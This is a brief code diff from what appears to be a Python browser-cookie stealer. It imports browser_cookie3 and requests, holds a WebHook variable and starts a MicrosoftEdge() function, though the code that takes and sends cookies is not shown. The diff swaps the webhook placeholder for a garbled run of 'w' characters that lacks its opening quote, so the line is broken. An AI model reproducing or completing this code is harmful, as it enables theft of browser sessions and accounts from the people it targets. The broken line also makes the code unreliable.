@@ -1,6 +1,6 @@
 import browser_cookie3, requests, threading
 
-WebHook = "YOUR WEBHOOK"
+WebHook = wwwwwwwwwwwwwwwwwwwwwwwwwwwwww"
 
 def MicrosoftEdge():
     try:
